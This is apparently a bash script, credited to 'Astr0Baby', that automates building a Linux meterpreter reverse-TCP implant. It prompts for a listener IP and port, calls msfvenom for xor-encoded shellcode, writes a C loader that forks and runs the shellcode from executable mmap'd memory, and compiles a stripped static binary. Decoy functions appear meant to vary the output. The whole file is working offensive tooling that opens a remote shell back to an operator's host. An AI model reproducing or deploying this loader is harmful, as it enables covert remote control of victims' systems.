clear 
echo "*********************************************************"
echo " Automatic METTLE loader generator  - FOR METASPLOIT     "
echo " For  Linux x86_64  - STATIC BINARY                      " 
echo " aarch64/armle/mipsbe/mipsle/x64/x86                     "   
echo " Fork() exercise using custom mettle loader              " 
echo " Astr0Baby                                               " 
echo "*********************************************************"
echo -e "What IP are we gonna use ? \c"
read IP 
echo -e "What Port Number are we gonna listen to? : \c"
read port
echo '[*] Checking if metasploit msfconsole and  msfvenom are present in current path ..'
if [ -x ./msfvenom ]; then
echo '[*] Found msfvenom in current path ........ good'

MSFVERSION=`./msfconsole --version` 
echo -n $MSFVERSION
else
echo '[-] No msfvenom in path...make sure you have this script in your metasploit-framework path'
exit 0
fi 

#  TESTED WITH GCC 6.5.0 (x64)   
#  TESTED WITH GCC 7.3.0 (x64) 
#  TESTED WITH GCC 8.2.0 (x64) 

echo '[*] Checking if GCC compiler is present..'
if [ -x /usr/bin/gcc ]; then
echo '[*] Found gcc ' 
GCCVERSION=`gcc --version | head -n 1`
echo  $GCCVERSION

else
echo '[-] No working gcc found ...make sure you have GCC compiler installed '
exit 0
fi

# Main msfvenom shellcode call here 

./msfvenom -p linux/x64/meterpreter/reverse_tcp EXITFUNC=process LHOST=$IP LPORT=$port -a x64 --platform linux -e x64/xor -f c -o test.c

# Here are all the current LINUX METERPRETER/METTLE paylods that can be used in this automation tool 
# In order to use them just comment the above and uncomment one below - make sure to follow the same in the LISTENER  
# Only the reverse_tcp payloads are used here 
# Make sure you change the below variables to suite your arch environment 

# ./msfvenom -p linux/x64/meterpreter/reverse_tcp      EXITFUNC=process LHOST=$IP LPORT=$port -a x64 --platform linux -e x64/xor -f c -o test.c
# ./msfvenom -p linux/x86/meterpreter/reverse_tcp      EXITFUNC=process LHOST=$IP LPORT=$port -a x64 --platform linux -e x64/xor -f c -o test.c

# Currently does not work 
# ./msfvenom -p linux/aarch64/meterpreter/reverse_tcp  EXITFUNC=process LHOST=$IP LPORT=$port -a aarch64 --platform linux  -f c -o test.c  
# ./msfvenom -p linux/armle/meterpreter/reverse_tcp    EXITFUNC=process LHOST=$IP LPORT=$port -a armle --platform linux    -f c -o test.c                      
# ./msfvenom -p linux/mipsbe/meterpreter/reverse_tcp   EXITFUNC=process LHOST=$IP LPORT=$port -a mipsbe --platform linux   -f c -o test.c                     
# ./msfvenom -p linux/mipsle/meterpreter/reverse_tcp   EXITFUNC=process LHOST=$IP LPORT=$port -a mipsle --platform linux   -f c -o test.c                   

# fat METTLE stuff seems to be identified by linux/arch/meterpreter_reverse_tcp string 

# Main variables defined here 
linuxpayloadc="./linux-payload.c"
linuxpayload="./linux-payload"

echo '[*] Cleaning up '
rm -f $linuxpayloadc 

#Main define here

echo "#include <stdio.h>" > temp.c 
echo '#include <sys/types.h>' >> temp.c
echo '#include <sys/ipc.h>' >> temp.c
echo '#include <sys/msg.h>' >> temp.c
echo '#include <string.h>' >> temp.c
echo '#include <sys/mman.h>' >> temp.c
echo '#include <fcntl.h>' >> temp.c
echo '#include <sys/socket.h>' >> temp.c
echo '#include <stdlib.h>' >> temp.c
echo '#include <errno.h>' >> temp.c
echo '#include <sys/mman.h>' >> temp.c
echo '#include <sys/types.h>' >> temp.c
echo '#include <sys/stat.h>' >> temp.c
echo '#include <sys/ioctl.h>' >> temp.c
echo '#include <unistd.h>' >> temp.c
echo '#include <strings.h>' >> temp.c
echo '#include <unistd.h>' >> temp.c
echo '#include <poll.h>' >> temp.c
echo '#include <pthread.h>' >> temp.c 
echo '#include <stdint.h>' >> temp.c 
echo '' >> temp.c 
cat test.c >> temp.c 
echo '' >> temp.c
echo 'void genlol();' >> temp.c
echo 'int random_in_range (unsigned int min, unsigned int max);' >> temp.c
echo 'int random_in_range (unsigned int min, unsigned int max)' >> temp.c
echo '{' >> temp.c 
echo 'int base_random = rand();' >> temp.c 
echo 'if (RAND_MAX == base_random){' >> temp.c
echo 'return random_in_range(min, max);' >> temp.c 
echo '}' >> temp.c
echo 'int range = max - min,' >> temp.c
echo 'remainder = RAND_MAX % range,' >> temp.c
echo 'bucket = RAND_MAX / range;' >> temp.c
echo 'if (base_random < RAND_MAX - remainder) {' >> temp.c
echo 'return min + base_random/bucket;' >> temp.c
echo '} else {' >> temp.c
echo 'return random_in_range (min, max);' >> temp.c
echo '}' >> temp.c
echo '}' >> temp.c
echo 'char* rev(char* str)' >> temp.c
echo '{' >> temp.c
echo 'int end=strlen(str)-1;' >> temp.c
echo 'int i;' >> temp.c
echo 'for(i=5; i<end; i++)' >> temp.c
echo '{' >> temp.c 
echo 'str[i] ^= 1;' >> temp.c
echo '}' >> temp.c
echo 'return str;' >> temp.c
echo '}' >> temp.c
echo 'int main(int argc, char **argv)' >> temp.c
echo '{' >> temp.c
echo 'system ("clear");' >> temp.c
echo 'printf ("=====================================\n");' >> temp.c
echo 'printf ("Testing m3tt73 loader fork() on Linux \n");' >> temp.c
echo 'printf ("=====================================\n");' >> temp.c
echo 'printf ("[+] Sleeping for a while ...\n");' >> temp.c
echo 'system("/bin/sleep 1");' >> temp.c
echo 'printf(".");' >> temp.c
echo 'fflush(stdout);' >> temp.c
echo 'system("/bin/sleep 1");' >> temp.c
echo 'printf("..");' >> temp.c
echo 'fflush(stdout);' >> temp.c
echo 'system("/bin/sleep 1");' >> temp.c
echo 'printf("...");' >> temp.c
echo 'fflush(stdout);' >> temp.c
echo 'system("/bin/sleep 1");' >> temp.c
echo 'printf("....");' >> temp.c
echo 'printf ("\n[+] Woke up to Stage 1!\n");' >> temp.c
echo 'pid_t process_id = 0;' >> temp.c
echo 'pid_t sid = 0;' >> temp.c
echo 'process_id = fork();' >> temp.c
echo 'if (process_id < 0)' >> temp.c
echo '{' >> temp.c
echo 'printf("fork failed!\n");' >> temp.c
echo 'exit(1);' >> temp.c
echo '}' >> temp.c
echo 'if (process_id > 0)' >> temp.c
echo '{' >> temp.c
echo 'printf("[+] Stage 2!\n");' >> temp.c
echo 'printf("[+] Here we go ...\n");' >> temp.c
echo 'exit(0);' >> temp.c
echo '}' >> temp.c
echo 'void *ptr = mmap(0, 0x2000, PROT_WRITE|PROT_READ|PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);' >> temp.c
echo 'memcpy(ptr,buf,sizeof buf);' >> temp.c
echo 'void (*fp)() = (void (*)())ptr;' >> temp.c
echo 'fp();' >> temp.c
echo 'printf ("\n[-] Exploit failed \n");' >> temp.c
echo '}' >> temp.c
echo 'void genlol(){' >> temp.c
echo 'int num1, num2, num3;' >> temp.c
echo 'num1=100;' >> temp.c
echo 'while (num1<=5) {' >> temp.c
echo 'num1=random_in_range(0,10000);' >> temp.c
echo 'num2=random_in_range(0,10000);' >> temp.c
echo 'num3=random_in_range(0,10000);' >> temp.c
echo 'printf ("\n[*] FAIL STAGE1 \n");' >> temp.c
echo 'printf ("\n[*] FAIL STAGE2 \n");' >> temp.c
echo '}' >> temp.c
echo '}' >> temp.c
mv temp.c $linuxpayloadc 
rm -f test.c 
if [ -f ./$linuxpayloadc ]; then
echo '[*] linux-payoad.c generated ...'
echo '[*] Compiling static linux x86_64 binary  ... ' 
gcc $linuxpayloadc -o $linuxpayload -static  
strip $linuxpayload 
echo '**************************************' 
ls -la $linuxpayload 
echo '[*] Done !' 
else
echo '[-] Something went wrong .. '
exit 0
fi
